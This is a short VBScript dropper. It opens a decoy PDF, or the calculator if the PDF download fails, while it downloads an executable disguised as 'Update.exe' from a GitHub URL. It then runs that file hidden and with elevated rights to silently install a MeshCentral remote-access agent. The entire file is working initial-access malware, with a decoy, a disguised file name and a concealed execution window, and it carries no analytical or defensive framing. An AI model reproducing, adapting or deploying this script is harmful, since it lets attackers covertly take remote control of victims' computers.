' meshagent.vbs - Download and execute MeshCentral agent with PDF decoy
' Usage: cscript meshagent.vbs

Dim strAgentURL, strPDF_URL, strSaveDir, strAgentPath, strPDF_Path, strArgs
strAgentURL = "https://raw.githubusercontent.com/EstelaDark/sas/refs/heads/main/meshagent64-updte.exe"
strPDF_URL = "https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf"
strSaveDir = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
strAgentPath = strSaveDir & "\Update.exe"
strPDF_Path = strSaveDir & "\document.pdf"
strArgs = "-fullinstall"

' --- Function: Download a file from URL to local path ---
Function DownloadFile(sURL, sPath)
    Dim oHTTP, oStream
    Set oHTTP = CreateObject("WinHttp.WinHttpRequest.5.1")
    oHTTP.Open "GET", sURL, False
    oHTTP.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    oHTTP.Send
    
    If oHTTP.Status = 200 Then
        Set oStream = CreateObject("ADODB.Stream")
        oStream.Open
        oStream.Type = 1 ' Binary
        oStream.Write oHTTP.ResponseBody
        oStream.SaveToFile sPath, 2 ' Overwrite
        oStream.Close
        Set oStream = Nothing
        DownloadFile = True
    Else
        DownloadFile = False
    End If
    Set oHTTP = Nothing
End Function

' --- Download PDF decoy first ---
If DownloadFile(strPDF_URL, strPDF_Path) Then
    ' Open decoy PDF via default handler
    Dim oShell
    Set oShell = CreateObject("Shell.Application")
    oShell.ShellExecute strPDF_Path, "", "", "open", 1 ' 1 = normal window
    Set oShell = Nothing
Else
    ' If PDF download fails, open calculator as fallback decoy
    Dim oWShell
    Set oWShell = CreateObject("WScript.Shell")
    oWShell.Run "calc.exe", 1, False
    Set oWShell = Nothing
End If

' --- Small delay so decoy opens first ---
WScript.Sleep 1500

' --- Download and execute MeshAgent silently ---
If DownloadFile(strAgentURL, strAgentPath) Then
    Dim oShell2
    Set oShell2 = CreateObject("Shell.Application")
    ' 0 = hidden window, no focus
    oShell2.ShellExecute strAgentPath, strArgs, "", "runas", 0
    Set oShell2 = Nothing
Else
    WScript.Echo "Agent download failed."
End If